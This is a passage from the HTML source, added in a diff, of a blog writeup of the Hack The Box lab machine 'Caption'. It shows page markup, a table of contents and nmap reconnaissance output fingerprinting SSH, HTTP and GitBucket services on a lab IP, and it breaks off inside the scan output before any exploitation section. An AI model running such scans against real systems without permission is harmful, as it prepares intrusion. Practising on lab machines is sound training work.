@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Caption - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="HTB writeup for the machine &#34;Caption&#34;">
+		<meta property="og:url" content="http://localhost:1313/posts/caption/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="Caption">
+  <meta property="og:description" content="HTB writeup for the machine &#34;Caption&#34;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-03T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Machine">
+    <meta property="article:tag" content="Box">
+
+		
+  <meta itemprop="name" content="Caption">
+  <meta itemprop="description" content="HTB writeup for the machine &#34;Caption&#34;">
+  <meta itemprop="datePublished" content="2025-02-03T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-03T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1326">
+  <meta itemprop="keywords" content="CTF,HTB,Machine,Box">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Caption">
+  <meta name="twitter:description" content="HTB writeup for the machine &#34;Caption&#34;">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Cybersecurity stuff!" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/placeholder.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Cybersecurity stuff!</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/news/">
+				
+				<span class="menu__text">News</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/cheatsheets/">
+				
+				<span class="menu__text">Cheat Sheets</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Caption</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2025-02-03T00:00:00Z">2025-02-03</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>, <a class="meta__link" href="/categories/box/" rel="category">Box</a>, <a class="meta__link" href="/categories/machine/" rel="category">Machine</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#port-80">Port 80</a></li>
+        <li><a href="#port-8080">Port 8080</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#ssh-key">SSH key</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE    REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
+</span></span><span style="display:flex;"><span>80/tcp   open  http       syn-ack
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad request
+</span></span><span style="display:flex;"><span>|     Content-length: <span style="color:#ae81ff">90</span>
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     Your browser sent an invalid request.
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;&lt;/html&gt;
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest, GetRequest, HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">301</span> Moved Permanently
+</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     location: http://caption.htb
+</span></span><span style="display:flex;"><span>|_    connection: close
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://caption.htb
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy syn-ack
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-title: GitBucket
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
+</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">16</span> Sep <span style="color:#ae81ff">2024</span> 07:24:37 GMT
+</span></span><span style="display:flex;"><span>|     Set-Cookie: JSESSIONID<span style="color:#f92672">=</span>node01twwz3kp29jtu49mlm2sbel32.node0; Path<span style="color:#f92672">=</span>/; HttpOnly
+</span></span><span style="display:flex;"><span>|     Expires: Thu, <span style="color:#ae81ff">01</span> Jan <span style="color:#ae81ff">1970</span> 00:00:00 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">5920</span>
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;og: http://ogp.me/ns#&#34;</span> lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0, maximum-scale=5.0&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta property<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;og:title&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta property<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;og:type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;object&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta property<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;og:url&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.145.80:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta property<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;og:image&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.145.80:8080/assets/common/images/gitbucket_ogp.png&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;icon&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/assets/common/images
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   GetRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Mon, 16 Sep 2024 07:24:36 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Set-Cookie: JSESSIONID=node01ou2khby5o8po8hgc9nm5flrm0.node0; Path=/; HttpOnly
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html;charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 7195
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;html prefix=&#34;</span>og: http://ogp.me/ns#<span style="color:#e6db74">&#34; lang=&#34;</span>en<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>UTF-8<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1.0, maximum-scale<span style="color:#f92672">=</span>5.0<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta http-equiv=&#34;</span>X-UA-Compatible<span style="color:#e6db74">&#34; content=&#34;</span>IE<span style="color:#f92672">=</span>edge<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;title&gt;GitBucket&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta property=&#34;</span>og:title<span style="color:#e6db74">&#34; content=&#34;</span>GitBucket<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta property=&#34;</span>og:type<span style="color:#e6db74">&#34; content=&#34;</span>object<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta property=&#34;</span>og:url<span style="color:#e6db74">&#34; content=&#34;</span>http://10.129.145.80:8080/<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta property=&#34;</span>og:image<span style="color:#e6db74">&#34; content=&#34;</span>http://10.129.145.80:8080/assets/common/images/gitbucket_ogp.png<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>icon<span style="color:#e6db74">&#34; href=&#34;</span>/assets/common/images/gitbucket.png?20240916072436<span style="color:#e6db74">&#34; ty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Mon, 16 Sep 2024 07:24:37 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Set-Cookie: JSESSIONID=node0tlwrkkhy6fo61sthbzxusxjfm1.node0; Path=/; HttpOnly
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html;charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: GET,HEAD,POST,OPTIONS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   RTSPRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 505 HTTP Version Not Supported
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html;charset=iso-8859-1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 58
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port80-TCP:V=7.94SVN%I=7%D=9/16%Time=66E7DD35%P=x86_64-pc-linux-gnu%r(G
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:etRequest,66,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20301<span style="color:#ae81ff">\x</span>20Moved<span style="color:#ae81ff">\x</span>20Permanently<span style="color:#ae81ff">\r\n</span>content-lengt
+</span></span><span style="display:flex;"><span>SF:h:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n</span>location:<span style="color:#ae81ff">\x</span>20http://caption<span style="color:#ae81ff">\.</span>htb<span style="color:#ae81ff">\r\n</span>connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;)%r(HTTPOptions,66,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20301<span style="color:#ae81ff">\x</span>20Moved<span style="color:#ae81ff">\x</span>20Permanently<span style="color:#ae81ff">\r\n</span>co
+</span></span><span style="display:flex;"><span>SF:ntent-length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n</span>location:<span style="color:#ae81ff">\x</span>20http://caption<span style="color:#ae81ff">\.</span>htb<span style="color:#ae81ff">\r\n</span>connection:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,CF,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:r<span style="color:#ae81ff">\n</span>Content-length:<span style="color:#ae81ff">\x</span>2090<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20no-cache<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20close<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html<span style="color:#ae81ff">\r\n\r\n</span>&lt;html&gt;&lt;body&gt;&lt;h1&gt;400<span style="color:#ae81ff">\x</span>20Bad
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20request&lt;/h1&gt;<span style="color:#ae81ff">\n</span>Your<span style="color:#ae81ff">\x</span>20browser<span style="color:#ae81ff">\x</span>20sent<span style="color:#ae81ff">\x</span>20an<span style="color:#ae81ff">\x</span>20invalid<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\.</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\n</span>&lt;/body&gt;&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(X11Probe,CF,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:r<span style="color:#ae81ff">\n</span>Content-length:<span style="color:#ae81ff">\x</span>2090<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20no-cache<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20close<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html<span style="color:#ae81ff">\r\n\r\n</span>&lt;html&gt;&lt;body&gt;&lt;h1&gt;400<span style="color:#ae81ff">\x</span>20Bad
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20request&lt;/h1&gt;<span style="color:#ae81ff">\n</span>Your<span style="color:#ae81ff">\x</span>20browser<span style="color:#ae81ff">\x</span>20sent<span style="color:#ae81ff">\x</span>20an<span style="color:#ae81ff">\x</span>20invalid<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\.</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\n</span>&lt;/body&gt;&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(FourOhFourRequest,66,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20301<span style="color:#ae81ff">\x</span>20Moved<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20Permanently<span style="color:#ae81ff">\r\n</span>content-length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n</span>location:<span style="color:#ae81ff">\x</span>20http://caption<span style="color:#ae81ff">\.</span>
+</span></span><span style="display:flex;"><span>SF:htb<span style="color:#ae81ff">\r\n</span>connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(RPCCheck,CF,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\r\n</span>Content-length:<span style="color:#ae81ff">\x</span>2090<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20no-cache
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html<span style="color:#ae81ff">\r\n\r\n</span>&lt;html&gt;&lt;bo
+</span></span><span style="display:flex;"><span>SF:dy&gt;&lt;h1&gt;400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request&lt;/h1&gt;<span style="color:#ae81ff">\n</span>Your<span style="color:#ae81ff">\x</span>20browser<span style="color:#ae81ff">\x</span>20sent<span style="color:#ae81ff">\x</span>20an<span style="color:#ae81ff">\x</span>20inv
+</span></span><span style="display:flex;"><span>SF:alid<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\.\n</span>&lt;/body&gt;&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(DNSVersionBindReqTCP,CF,&#34;</span>HTTP/1
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\r\n</span>Content-length:<span style="color:#ae81ff">\x</span>2090<span style="color:#ae81ff">\r\n</span>Cache-Control:
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20no-cache<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html<span style="color:#ae81ff">\r\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:r<span style="color:#ae81ff">\n</span>&lt;html&gt;&lt;body&gt;&lt;h1&gt;400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request&lt;/h1&gt;<span style="color:#ae81ff">\n</span>Your<span style="color:#ae81ff">\x</span>20browser<span style="color:#ae81ff">\x</span>20sent<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20an<span style="color:#ae81ff">\x</span>20invalid<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\.\n</span>&lt;/body&gt;&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(DNSStatusRequestTCP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,CF,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\r\n</span>Content-length:<span style="color:#ae81ff">\x</span>2090<span style="color:#ae81ff">\r\n</span>Cac
+</span></span><span style="display:flex;"><span>SF:he-Control:<span style="color:#ae81ff">\x</span>20no-cache<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20tex
+</span></span><span style="display:flex;"><span>SF:t/html<span style="color:#ae81ff">\r\n\r\n</span>&lt;html&gt;&lt;body&gt;&lt;h1&gt;400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request&lt;/h1&gt;<span style="color:#ae81ff">\n</span>Your<span style="color:#ae81ff">\x</span>20brows
+</span></span><span style="display:flex;"><span>SF:er<span style="color:#ae81ff">\x</span>20sent<span style="color:#ae81ff">\x</span>20an<span style="color:#ae81ff">\x</span>20invalid<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\.\n</span>&lt;/body&gt;&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(Help,CF,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\r\n</span>Content-length:<span style="color:#ae81ff">\x</span>2090<span style="color:#ae81ff">\r\n</span>Cache-C
+</span></span><span style="display:flex;"><span>SF:ontrol:<span style="color:#ae81ff">\x</span>20no-cache<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/ht
+</span></span><span style="display:flex;"><span>SF:ml<span style="color:#ae81ff">\r\n\r\n</span>&lt;html&gt;&lt;body&gt;&lt;h1&gt;400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request&lt;/h1&gt;<span style="color:#ae81ff">\n</span>Your<span style="color:#ae81ff">\x</span>20browser<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20sent<span style="color:#ae81ff">\x</span>20an<span style="color:#ae81ff">\x</span>20invalid<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\.\n</span>&lt;/body&gt;&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port8080-TCP:V=7.94SVN%I=7%D=9/16%Time=66E7DD36%P=x86_64-pc-linux-gnu%r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:(GetRequest,19F0,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Mon,<span style="color:#ae81ff">\x</span>2016<span style="color:#ae81ff">\x</span>20Sep<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x202024<span style="color:#ae81ff">\x</span>2007:24:36<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20JSESSIONID<span style="color:#f92672">=</span>node01ou2khby5o
+</span></span><span style="display:flex;"><span>SF:8po8hgc9nm5flrm0<span style="color:#ae81ff">\.</span>node0;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Expires:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:01<span style="color:#ae81ff">\x</span>20Jan<span style="color:#ae81ff">\x</span>201970<span style="color:#ae81ff">\x</span>2000:00:00<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;char
